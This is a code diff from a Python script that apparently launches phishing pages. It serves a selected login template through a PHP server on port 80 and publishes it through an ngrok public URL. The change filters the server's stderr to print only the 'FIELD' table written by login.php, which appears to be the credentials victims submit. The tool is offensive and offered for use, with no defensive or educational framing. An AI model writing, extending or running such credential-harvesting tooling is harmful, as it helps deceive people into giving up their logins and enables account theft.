@@ -66,30 +66,31 @@ def main():
                 print()
                 print(f"{Fore.CYAN + Style.BRIGHT}[🌐 Localhost URL]{Style.RESET_ALL}   ➤  {Fore.YELLOW}http://{local_ip}/{selected_template}/")
                 print(f"{Fore.GREEN + Style.BRIGHT}[🚀 Ngrok Public URL]{Style.RESET_ALL} ➤  {Fore.MAGENTA}{ngrok_url}/{selected_template}/")
-                print()
+                print(template_path)
 
                 # Function to run PHP server
-                def run_php():
-                    
+                def run_php():    
                     php_process = subprocess.Popen(
-                        ["php", "-S", "0.0.0.0:80"],
-                        cwd=template_path,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.STDOUT,
+                        ["php", "-S", "0.0.0.0:80", "-t", "templates"],
+                        stdout=subprocess.DEVNULL,        # Suppress normal STDOUT (PHP logs)
+                        stderr=subprocess.PIPE,           # Capture STDERR (your table logs)
                         text=True
                     )
+
+                    # Print only your custom table output from login.php
                     try:
-                        for line in php_process.stdout:
-                            print(f"{Fore.WHITE}[PHP]{Style.RESET_ALL} {line.strip()}")
+                        for line in php_process.stderr:
+                            if "FIELD" in line or "+" in line or "|" in line:
+                                print(line.strip())
                     except KeyboardInterrupt:
-                        pass
+                        php_process.terminate()
 
                 # Run PHP server in background thread
                 server_thread = threading.Thread(target=run_php, daemon=True)
                 server_thread.start()
 
                 # Wait for user input to stop
-                if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}").strip() == "0":
+                if input(f"{Fore.RED}⛔ Press 0 to stop the PHP server and return to menu: {Style.RESET_ALL}\n").strip() == "0":
                     print(f"{Fore.YELLOW}🛑 Stopping PHP server...{Style.RESET_ALL}")
                     os.system("pkill -f 'php -S'")  # Works on Unix/macOS. For Windows, use .terminate() with stored process.
                         
